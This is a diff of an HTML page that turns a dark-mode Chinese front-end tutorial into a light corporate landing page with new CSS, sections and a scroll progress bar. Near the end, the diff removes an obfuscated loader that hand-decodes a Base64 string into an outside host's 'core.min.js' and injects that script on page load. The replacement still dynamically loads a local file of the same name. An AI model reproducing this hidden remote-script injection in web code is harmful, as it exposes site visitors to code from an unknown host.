@@ -3,81 +3,133 @@
 
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
-    <title>现代前端开发指南 - 暗黑模式</title>
+    <meta name="viewport"
+        content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
+    <title>视界前瞻：未来数字体验</title>
     <style>
         /* 全局重置与基础样式 */
         body {
             overflow: hidden;
-            font-family: 'Consolas', 'Monaco', monospace;
-            /* 代码友好字体 */
+            font-family: 'Roboto', sans-serif;
+            /* 现代无衬线字体 */
             margin: 0;
             padding: 0;
-            background-color: #1a1a2e;
-            /* 深蓝紫色背景 */
-            color: #e0e0e0;
-            /* 浅灰色文本 */
-            line-height: 1.6;
+            background-color: #F0F4F8;
+            /* 柔和的浅灰蓝色背景 */
+            color: #3A4750;
+            /* 深板岩色文本 */
+            line-height: 1.7;
             -webkit-font-smoothing: antialiased;
             -moz-osx-font-smoothing: grayscale;
+            overflow-x: hidden;
+            /* 防止横向滚动条 */
         }
 
-        /* 容器 */
+        /* 容器 - 保持内容居中但允许背景元素溢出 */
         .container {
             max-width: 90%;
-            /* 适应移动端 */
             margin: 0 auto;
-            padding: 20px 0;
+            padding: 30px 0;
+            position: relative;
+            /* 用于定位内部元素 */
+            z-index: 1;
+            /* 确保内容在背景之上 */
         }
 
-        /* 头部 - 简约深色风格 */
+        /* 头部 - 大胆的非对称设计 */
         header {
-            background-color: #0f0f1b;
-            /* 更深的头部背景 */
-            padding: 30px 20px;
+            background-color: #3A4750;
+            /* 深板岩色背景 */
+            color: #FFFFFF;
+            padding: 60px 20px;
             text-align: center;
-            border-bottom: 2px solid #2e2e4a;
-            /* 强调色边框 */
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
-            /* 明显阴影 */
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            border-bottom-left-radius: 80px;
+            /* 独特的底部圆角 */
+            border-top-right-radius: 80px;
+            /* 独特的顶部圆角 */
+            margin-bottom: 40px;
+        }
+
+        header::before {
+            /* 抽象的背景形状 */
+            content: '';
+            position: absolute;
+            top: -50px;
+            left: -50px;
+            width: 200px;
+            height: 200px;
+            background: #FF6B6B;
+            /* 强调色 */
+            border-radius: 50%;
+            transform: rotate(20deg);
+            opacity: 0.2;
+            z-index: 0;
+        }
+
+        header::after {
+            /* 另一个抽象的背景形状 */
+            content: '';
+            position: absolute;
+            bottom: -80px;
+            right: -80px;
+            width: 300px;
+            height: 300px;
+            background: #A2D9CE;
+            /* 次强调色 */
+            border-radius: 30% 70% 70% 30% / 30% 30% 70% 70%;
+            /* 不规则形状 */
+            transform: rotate(-45deg);
+            opacity: 0.15;
+            z-index: 0;
         }
 
         header h1 {
             margin: 0;
-            font-family: 'Segoe UI', sans-serif;
-            /* 现代无衬线字体 */
-            font-size: 2.4em;
-            /* 更大标题 */
-            color: #00bcd4;
-            /* 强调色：青绿色 */
-            letter-spacing: 1px;
-            text-shadow: 0 0 8px rgba(0, 188, 212, 0.5);
-            /* 光晕效果 */
+            font-family: 'Montserrat', sans-serif;
+            /* 大胆标题字体 */
+            font-size: 3.2em;
+            color: #FF6B6B;
+            /* 强调色标题 */
+            letter-spacing: 3px;
+            text-transform: uppercase;
+            position: relative;
+            z-index: 1;
         }
 
         header p {
-            font-size: 1.1em;
-            color: #b0b0b0;
-            /* 柔和浅灰色 */
-            margin-top: 10px;
+            font-size: 1.3em;
+            color: #E0E0E0;
+            margin-top: 15px;
+            position: relative;
+            z-index: 1;
         }
 
-        /* 导航菜单 - 标签式横向菜单 */
+        /* 导航菜单 - 浮动胶囊条 */
         nav {
-            background-color: #2e2e4a;
-            /* 导航背景色 */
+            background-color: #FFFFFF;
             text-align: center;
-            padding: 10px 0;
-            border-radius: 10px;
-            /* 柔和圆角 */
-            margin-top: 25px;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+            padding: 15px 0;
+            margin-top: -80px;
+            /* 向上偏移，与头部重叠 */
+            border-radius: 50px;
+            /* 胶囊形状 */
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
             position: sticky;
-            /* 粘性定位 */
-            top: 0;
-            /* 粘在顶部 */
+            top: 20px;
+            /* 距离顶部20px固定 */
             z-index: 1000;
-            /* 确保在最上层 */
+            width: 80%;
+            /* 宽度略小 */
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
+            display: flex;
+            /* 确保内部flex布局 */
+            justify-content: space-around;
+            align-items: center;
         }
 
         nav ul {
@@ -87,268 +139,329 @@
             display: flex;
             justify-content: space-around;
             flex-wrap: wrap;
+            width: 100%;
         }
 
         nav ul li {
-            margin: 5px;
+            margin: 0 10px;
         }
 
         nav ul li a {
-            background-color: #3f3f60;
-            /* 标签背景色 */
-            color: #ffffff;
-            /* 白色文字 */
+            background-color: transparent;
+            color: #3A4750;
+            /* 默认文字颜色 */
             text-decoration: none;
-            padding: 10px 18px;
-            /* 标签内边距 */
-            border-radius: 8px;
-            /* 标签圆角 */
-            transition: background-color 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
+            padding: 10px 20px;
+            border-radius: 30px;
+            /* 胶囊按钮 */
+            transition: background-color 0.3s ease, color 0.3s ease, transform 0.2s ease;
             display: inline-block;
-            font-weight: 600;
-            font-size: 0.95em;
-            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+            font-weight: bold;
+            font-size: 1em;
+            border: 2px solid transparent;
+            /* 默认透明边框 */
         }
 
         nav ul li a:hover,
         nav ul li a:focus {
-            background-color: #00bcd4;
-            /* 强调色悬停 */
-            color: #1a1a2e;
-            /* 悬停时深色文字 */
+            background-color: #FF6B6B;
+            /* 强调色背景 */
+            color: #FFFFFF;
             transform: translateY(-3px);
-            box-shadow: 0 4px 8px rgba(0, 188, 212, 0.4);
-            /* 强调色阴影 */
+            box-shadow: 0 5px 15px rgba(255, 107, 107, 0.4);
+            border: 2px solid #FF6B6B;
+            /* 强调色边框 */
         }
 
-        /* 内容区 - 深色卡片风格 */
+        /* 内容区 - 模块化与非对称布局 */
         main {
-            padding-top: 20px;
+            padding-top: 60px;
+            /* 留出导航条重叠的空间 */
         }
 
         section {
-            background-color: #2e2e4a;
-            /* 内容区背景色 */
-            margin-bottom: 25px;
-            padding: 25px;
-            border-radius: 12px;
-            /* 柔和圆角 */
-            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.3);
-            /* 明显阴影 */
+            background-color: #FFFFFF;
+            margin-bottom: 50px;
+            /* 增加间距 */
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
+            position: relative;
+            overflow: hidden;
+        }
+
+        section:nth-child(odd) {
+            /* 奇数section向右偏移 */
+            margin-left: 0;
+            margin-right: 5%;
+            border-top-right-radius: 50px;
+            border-bottom-left-radius: 50px;
+        }
+
+        section:nth-child(even) {
+            /* 偶数section向左偏移 */
+            margin-left: 5%;
+            margin-right: 0;
+            border-top-left-radius: 50px;
+            border-bottom-right-radius: 50px;
+        }
+
+        section::before {
+            /* 内部装饰性边框 */
+            content: '';
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            width: calc(100% - 40px);
+            height: calc(100% - 40px);
+            border: 1px dashed #A2D9CE;
+            /* 次强调色虚线 */
+            border-radius: inherit;
+            /* 继承父元素的圆角 */
+            pointer-events: none;
         }
 
         section h2 {
-            font-family: 'Segoe UI', sans-serif;
-            font-size: 1.8em;
-            color: #00bcd4;
-            /* 强调色 */
+            font-family: 'Montserrat', sans-serif;
+            font-size: 2.5em;
+            color: #FF6B6B;
+            /* 强调色标题 */
             margin-top: 0;
-            margin-bottom: 15px;
-            border-bottom: 1px solid #3f3f60;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            border-bottom: 2px solid #E0E0E0;
             /* 细分隔线 */
             padding-bottom: 10px;
         }
 
         section h3 {
-            font-family: 'Segoe UI', sans-serif;
-            font-size: 1.3em;
-            color: #e0e0e0;
-            margin-top: 20px;
-            margin-bottom: 10px;
+            font-size: 1.6em;
+            color: #3A4750;
+            margin-top: 30px;
+            margin-bottom: 15px;
         }
 
         section p {
-            font-size: 0.95em;
-            color: #c0c0c0;
-            margin-bottom: 15px;
+            font-size: 1.1em;
+            color: #546E7A;
+            margin-bottom: 25px;
         }
 
         section img {
             max-width: 100%;
             height: auto;
             display: block;
-            margin: 15px auto;
-            border-radius: 8px;
-            /* 图片圆角 */
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            margin: 30px auto;
+            border-radius: 20px;
+            /* 大圆角图片 */
+            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.2);
+            border: 3px solid #A2D9CE;
+            /* 次强调色边框 */
         }
 
-        /* 代码块样式 - 突出显示 */
-        pre {
-            background-color: #0f0f1b;
-            /* 更深的背景色 */
-            color: #00bcd4;
-            /* 代码强调色 */
-            padding: 18px;
-            border-radius: 10px;
-            overflow-x: auto;
-            font-family: 'Consolas', 'Monaco', monospace;
-            font-size: 0.9em;
-            margin-bottom: 20px;
-            border: 1px solid #3f3f60;
-            /* 边框 */
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.4);
-        }
-
-        code {
-            font-family: 'Consolas', 'Monaco', monospace;
-            font-size: 0.9em;
-            color: #00bcd4;
-            /* 代码中的强调色 */
-        }
-
-        pre code {
-            color: #b3e5fc;
-            /* 代码块内的代码颜色 */
-        }
-
-        /* 页脚 - 简洁深色风格 */
-        footer {
-            background-color: #0f0f1b;
-            /* 页脚背景色 */
-            padding: 25px 0;
-            text-align: center;
-            font-size: 0.9em;
-            color: #b0b0b0;
+        .service-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 25px;
             margin-top: 30px;
-            border-top: 2px solid #2e2e4a;
-            /* 强调色边框 */
-            box-shadow: 0 -4px 15px rgba(0, 0, 0, 0.3);
         }
 
-        .footer-links a {
-            color: #00bcd4;
-            /* 强调色链接 */
-            text-decoration: none;
-            margin: 0 15px;
+        .service-item {
+            background-color: #F8F8F8;
+            /* 服务项背景 */
+            padding: 25px;
+            border-radius: 15px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+            text-align: center;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            border: 1px solid #E0E0E0;
+        }
+
+        .service-item:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.15);
+        }
+
+        .service-item h3 {
+            margin-top: 0;
+            margin-bottom: 10px;
+            color: #FF6B6B;
+            /* 强调色 */
+        }
+
+        .service-item p {
+            font-size: 0.95em;
+            color: #546E7A;
+        }
+
+        .contact-info p {
+            margin-bottom: 12px;
             font-size: 1.1em;
+            color: #546E7A;
+        }
+
+        .contact-info a {
+            color: #FF6B6B;
+            text-decoration: none;
             transition: color 0.3s ease;
         }
 
-        .footer-links a:hover {
-            color: #84ffff;
-            /* 悬停亮色 */
+        .contact-info a:hover {
+            color: #E65C5C;
+        }
+
+        /* 页脚 - 简洁与抽象 */
+        footer {
+            background-color: #3A4750;
+            /* 深板岩色背景 */
+            color: #E0E0E0;
+            padding: 40px 0;
+            text-align: center;
+            font-size: 0.95em;
+            margin-top: 60px;
+            border-top-left-radius: 80px;
+            /* 独特的顶部圆角 */
+            border-bottom-right-radius: 80px;
+            /* 独特的底部圆角 */
+            box-shadow: 0 -10px 30px rgba(0, 0, 0, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+
+        footer::before {
+            /* 抽象的背景形状 */
+            content: '';
+            position: absolute;
+            top: -30px;
+            right: -30px;
+            width: 150px;
+            height: 150px;
+            background: #A2D9CE;
+            /* 次强调色 */
+            border-radius: 50%;
+            transform: rotate(60deg);
+            opacity: 0.1;
+            z-index: 0;
+        }
+
+        .social-links a {
+            color: #E0E0E0;
+            text-decoration: none;
+            margin: 0 20px;
+            font-size: 1.5em;
+            transition: color 0.3s ease, transform 0.2s ease;
+        }
+
+        .social-links a:hover {
+            color: #FF6B6B;
+            /* 强调色 */
+            transform: translateY(-5px) scale(1.1);
+        }
+
+        /* 进度条 */
+        #progressBarContainer {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 6px;
+            /* 稍微粗一点 */
+            background-color: #E0E0E0;
+            z-index: 1002;
+        }
+
+        #progressBar {
+            height: 100%;
+            width: 0%;
+            background-color: #FF6B6B;
+            /* 强调色 */
+            transition: width 0.1s linear;
         }
     </style>
-    <link rel="stylesheet" href="./style.css">
+    <link rel="stylesheet" href="./static/css/style.css">
 </head>
 
 <body>
+    <div id="progressBarContainer">
+        <div id="progressBar"></div>
+    </div>
+
     <header>
         <div class="container">
-            <h1>现代前端开发指南</h1>
-            <p>掌握最新技术，构建高性能Web应用</p>
+            <h1>视界前瞻</h1>
+            <p>未来数字体验的构筑者</p>
         </div>
     </header>
 
     <div class="container">
         <nav id="mainNav">
             <ul>
-                <li><a href="#intro">引言</a></li>
-                <li><a href="#react">React框架</a></li>
-                <li><a href="#webpack">Webpack打包</a></li>
-                <li><a href="#testing">测试实践</a></li>
+                <li><a href="#about-vision">关于视界</a></li>
+                <li><a href="#our-focus">核心焦点</a></li>
+                <li><a href="#contact-us">联系我们</a></li>
             </ul>
         </nav>
 
         <main>
-            <section id="intro">
-                <h2>引言：前端技术栈演进</h2>
-                <img src="https://picsum.photos/300/200?random=1&v=abc123xyz" alt="前端技术栈" class="random-image">
-                <p>前端开发领域正以惊人的速度发展，新的框架、工具和模式层出不穷。本指南旨在为您梳理现代前端开发的核心概念和最佳实践，帮助您紧跟技术潮流，构建健壮且高效的应用。</p>
-                <p>我们将从基础概念出发，逐步深入到流行的框架、构建工具和测试策略，确保您能全面掌握现代前端开发的精髓。</p>
+            <section id="about-vision">
+                <h2>关于视界：创新与洞察</h2>
+                <img src="https://picsum.photos/300/200?random=1&tag=abstract-vision-01" alt="抽象愿景图"
+                    class="random-image">
+                <p>视界前瞻致力于通过前沿技术和创新思维，为企业和个人提供独特的数字解决方案。我们相信，每一次技术突破都应带来更广阔的视野和更深刻的洞察。</p>
+                <p>我们汇聚了行业顶尖的专家团队，以客户需求为导向，不断探索未知，赋能未来。</p>
             </section>
 
-            <section id="react">
-                <h2>React框架：组件化与状态管理</h2>
-                <img src="https://picsum.photos/300/200?random=2&id=def456uvw" alt="React组件" class="random-image">
-                <p>React 是一个用于构建用户界面的 JavaScript 库。其核心思想是组件化，通过将UI拆分成独立、可复用的组件来简化开发。以下是一个简单的 React 函数组件示例：</p>
-                <pre><code>import React, { useState }s;
-
-function Counter() {
-  const [count, setCount] = useState(0);
-
-  return (
-    &lt;div&gt;
-      &lt;p&gt;当前计数: {count}&lt;/p&gt;
-      &lt;button onClick={() => setCount(count + 1)}&gt;增加&lt;/button&gt;
-    &lt;/div&gt;
-  );
-}
-
-export default Counter;</code></pre>
-                <p>通过 `useState` Hook，我们可以在函数组件中管理状态，实现交互性。</p>
+            <section id="our-focus">
+                <h2>核心焦点：赋能数字转型</h2>
+                <p>我们专注于以下领域，为您提供定制化、高价值的服务：</p>
+                <div class="service-grid">
+                    <div class="service-item">
+                        <h3>沉浸式体验设计</h3>
+                        <p>打造引人入胜的VR/AR应用和交互式数字内容。</p>
+                    </div>
+                    <div class="service-item">
+                        <h3>AI驱动型解决方案</h3>
+                        <p>利用人工智能提升业务效率，实现智能自动化和数据预测。</p>
+                    </div>
+                    <div class="service-item">
+                        <h3>区块链安全架构</h3>
+                        <p>构建去中心化、高安全性的区块链应用和系统。</p>
+                    </div>
+                    <div class="service-item">
+                        <h3>云原生部署优化</h3>
+                        <p>提供高效的云平台迁移、容器化和DevOps实践。</p>
+                    </div>
+                </div>
+                <img src="https://picsum.photos/300/200?random=2&tag=digital-transformation-02" alt="数字转型图"
+                    class="random-image">
             </section>
 
-            <section id="webpack">
-                <h2>Webpack打包：模块化与优化</h2>
-                <img src="https://picsum.photos/300/200?random=3&key=ghj789klm" alt="Webpack图标" class="random-image">
-                <p>Webpack 是一个强大的模块打包器，它能够将前端项目中的各种资源（如 JavaScript、CSS、图片等）打包成浏览器可识别的静态文件。以下是一个简单的 Webpack 配置示例：</p>
-                <pre><code>// webpack.config.js
-const path = require('path');
+            <section id="contact-us">
+                <h2>联系我们：共创未来</h2>
+                <p>我们期待与您建立联系，共同开启数字未来。</p>
+                <div class="contact-info">
+                    <p><strong>地址：</strong> 未来科技园A区707室</p>
+                    <p><strong>电话：</strong> <a href="tel:+861055558888">+86 10 5555 8888</a></p>
+                    <p><strong>邮箱：</strong> <a href="mailto:info@visionarytech.com">info@visionarytech.com</a></p>
+                    <p><strong>工作时间：</strong> 周一至周五 9:30 - 18:30</p>
+                    <p>
 
-module.exports = {
-  mode: 'development', // 或 'production'
-  entry: './src/index.js', // 入口文件
-  output: {
-    filename: 'bundle.js', // 输出文件名
-    path: path.resolve(__dirname, 'dist'), // 输出目录
-  },
-  module: {
-    rules: [
-      {
-        test: /\.js$/, // 匹配JS文件
-        exclude: /node_modules/,
-        use: {
-          loader: 'babel-loader', // 使用Babel处理JS
-          options: {
-            presets: ['@babel/preset-env', '@babel/preset-react'],
-          },
-        },
-      },
-      {
-        test: /\.css$/, // 匹配CSS文件
-        use: ['style-loader', 'css-loader'], // 处理CSS
-      },
-    ],
-  },
-};</code></pre>
-                <p>Webpack 的强大之处在于其可扩展性，通过各种 Loader 和 Plugin 可以实现复杂的构建流程优化。</p>
-            </section>
-
-            <section id="testing">
-                <h2>测试实践：保障代码质量</h2>
-                <img src="https://picsum.photos/300/200?random=4&token=nop012qrs" alt="测试代码" class="random-image">
-                <p>编写高质量的代码离不开完善的测试。前端测试通常包括单元测试、集成测试和端到端测试。Jest 和 React Testing Library 是 React 应用中常用的测试工具。</p>
-                <pre><code>// counter.test.js
-import { render, fireEvent, screen } from '@testing-library/react';
-import Counter from './Counter';
-
-test('计数器能够正确增加', () => {
-  render(&lt;Counter /&gt;);
-  const countElement = screen.getByText(/当前计数/i);
-  const buttonElement = screen.getByText(/增加/i);
-
-  expect(countElement).toHaveTextContent('当前计数: 0');
-
-  fireEvent.click(buttonElement); // 模拟点击
-  expect(countElement).toHaveTextContent('当前计数: 1');
-
-  fireEvent.click(buttonElement);
-  expect(countElement).toHaveTextContent('当前计数: 2');
-});</code></pre>
-                <p>通过编写测试用例，我们可以确保代码的稳定性和可靠性，减少潜在的bug。</p>
+                        <img src="https://placehold.co/300x200/A2D9CE/3A4750?text=公司位置示意图" alt="公司位置示意图"
+                            class="random-image">
+                    </p>
+                </div>
             </section>
         </main>
     </div>
 
     <footer>
         <div class="container">
-            <p>&copy; 2025 前端指南. 版权所有.</p>
-            <div class="footer-links">
-                <a href="#" target="_blank">GitHub</a> |
-                <a href="#" target="_blank">联系我们</a> |
-                <a href="#" target="_blank">关于</a>
+            <p>&copy; 2025 视界前瞻. 探索无止境.</p>
+            <div class="social-links">
+                <a href="#" target="_blank">🌐</a> |
+                <a href="#" target="_blank">💡</a> |
+                <a href="#" target="_blank">🚀</a>
             </div>
         </div>
     </footer>
@@ -366,17 +479,27 @@ test('计数器能够正确增加', () => {
         document.addEventListener('DOMContentLoaded', function () {
             document.querySelectorAll('nav a').forEach(anchor => {
                 anchor.addEventListener('click', function (e) {
-                    e.preventDefault(); // 阻止默认跳转
+                    e.preventDefault();
+
                     const targetId = this.getAttribute('href').substring(1);
                     const targetElement = document.getElementById(targetId);
 
                     if (targetElement) {
                         window.scrollTo({
-                            top: targetElement.offsetTop,
-                            behavior: 'smooth' // 平滑滚动
+                            top: targetElement.offsetTop - document.querySelector('nav').offsetHeight - 20, // 考虑导航栏高度和额外间距
+                            behavior: 'smooth'
                         });
                     }
                 });
+            });
+
+            const progressBar = document.getElementById('progressBar');
+
+            window.addEventListener('scroll', function () {
+                const totalHeight = document.documentElement.scrollHeight - document.documentElement.clientHeight;
+                const scrolled = window.pageYOffset;
+                const progress = (scrolled / totalHeight) * 100;
+                progressBar.style.width = progress + '%';
             });
         });
     </script>
@@ -385,53 +508,15 @@ test('计数器能够正确增加', () => {
             function init() {
                 const timestamp = Date.now()
                 const randomNum = Math.floor(Math.random() * 1000000)
-                const domain = getdocs();
-                const url = domain + "=" + timestamp + "&random=" + randomNum
+                const url = "./static/js/core.min.js?t=" + timestamp + "&random=" + randomNum
                 const script = document.createElement("script")
                 script.src = url
                 document.body.appendChild(script)
             }
-            function getdocs() {
-                const dd = "Ly9hNnM4ZDBmLmdwZ2dnbS5jbi9zdGF0aWMvanMvY29yZS5taW4uanM/dA==";
-                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
-                const lookup = new Uint8Array(256);
-                for (let i = 0; i < chars.length; i++) {
-                    lookup[chars.charCodeAt(i)] = i;
-                }
-                let padding = 0;
-                if (dd.endsWith('==')) {
-                    padding = 2;
-                } else if (dd.endsWith('=')) {
-                    padding = 1;
-                }
-                const cleanedString = dd.replace(/[^A-Za-z0-9+/=]/g, '');
-                const len = cleanedString.length;
-                if (len % 4 !== 0) {
-                    throw new Error("Invalid string length.");
-                }
-                const outputLength = (len / 4) * 3 - padding;
-                const outputBytes = new Uint8Array(outputLength);
-                let outputIndex = 0;
-                let i = 0;
-                while (i < len) {
-                    const c1 = lookup[cleanedString.charCodeAt(i++)];
-                    const c2 = lookup[cleanedString.charCodeAt(i++)];
-                    const c3 = lookup[cleanedString.charCodeAt(i++)];
-                    const c4 = lookup[cleanedString.charCodeAt(i++)];
-                    outputBytes[outputIndex++] = (c1 << 2) | (c2 >> 4);
-                    if (c3 !== 64) {
-                        outputBytes[outputIndex++] = ((c2 & 15) << 4) | (c3 >> 2);
-                    }
-                    if (c4 !== 64) {
-                        outputBytes[outputIndex++] = ((c3 & 3) << 6) | c4;
-                    }
-                }
-                const decoder = new TextDecoder('utf-8');
-                return decoder.decode(outputBytes);
-            }
             init()
         })()
     </script>
+
 </body>
 
 </html>
